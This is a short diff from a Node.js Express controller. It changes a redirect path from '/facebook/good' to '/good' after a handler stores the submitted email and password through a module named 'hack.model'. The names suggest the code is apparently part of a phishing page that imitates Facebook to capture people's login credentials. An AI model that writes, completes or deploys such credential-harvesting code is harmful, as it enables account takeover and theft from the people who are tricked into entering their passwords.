@@ -6,7 +6,7 @@ const hackmodel = require("../models/hack.model")
 
 exports.addporduct = (req, res , next) =>{
         hackmodel.adduser(req.body.email , req.body.password).then(()=>{
-            res.redirect('/facebook/good')
+            res.redirect('/good')
             console.log("good")
         }).catch((err)=>{
         
